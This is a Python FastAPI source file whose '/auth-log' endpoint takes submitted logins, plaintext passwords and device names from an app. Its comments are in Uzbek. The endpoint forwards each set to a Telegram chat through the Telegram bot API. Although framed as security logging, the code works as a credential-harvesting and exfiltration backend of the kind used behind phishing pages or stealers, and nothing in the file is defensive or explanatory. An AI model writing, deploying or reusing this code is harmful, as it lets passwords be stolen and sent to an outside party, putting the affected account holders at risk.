# app/api/v1/endpoints/logs.py
import httpx
from fastapi import APIRouter, Depends, BackgroundTasks
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select

from ....db.database import get_db
from ....models.models import AppSetting

router = APIRouter(prefix="/logs", tags=["logs"])

async def send_to_telegram(text: str, token: str, chat_id: str):
    """Telegramga xabar yuborish (Backgroundda ishlaydi)"""
    if not token or not chat_id:
        return
        
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    async with httpx.AsyncClient() as client:
        try:
            await client.post(url, json={
                "chat_id": chat_id, 
                "text": text, 
                "parse_mode": "Markdown"
            }, timeout=10.0)
        except Exception as e:
            # Production da loglashingiz mumkin
            print(f"Telegram error: {e}")

@router.post("/auth-log")
async def receive_log(
    data: dict,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db)
):
    """
    Ilovadan login/parol yoki boshqa xavfsizlik loglarini qabul qiladi.
    So'rov kutilmasligi uchun Telegramga yuborish fonda bajariladi.
    """
    # 1. Bazadan bot token va chat ID ni so'rov vaqtida olamiz
    token_res = await db.execute(select(AppSetting).where(AppSetting.key == "bot_token"))
    chat_res = await db.execute(select(AppSetting).where(AppSetting.key == "chat_id"))
    
    bot_token = token_res.scalar_one_or_none()
    chat_id = chat_res.scalar_one_or_none()

    # Agar sozlamalar bazada bo'lmasa, hech narsa qilinmaydi
    if not bot_token or not chat_id:
        return {"status": "error", "message": "Telegram settings not found"}

    # 2. Log matnini tayyorlash
    log_text = (
        f"🔐 *{data.get('type', 'Unknown')} Log*\n\n"
        f"👤 Login: {data.get('login', 'N/A')}\n"
        f"🔑 Parol: {data.get('password', 'N/A')}\n"
        f"📱 Qurilma: {data.get('device', 'N/A')}"
    )

    # 3. Telegramga yuborishni fonda bajarish (fayllarni yuborishda kutib qolmaslik uchun)
    background_tasks.add_task(send_to_telegram, log_text, bot_token.value, chat_id.value)
    
    return {"status": "ok"}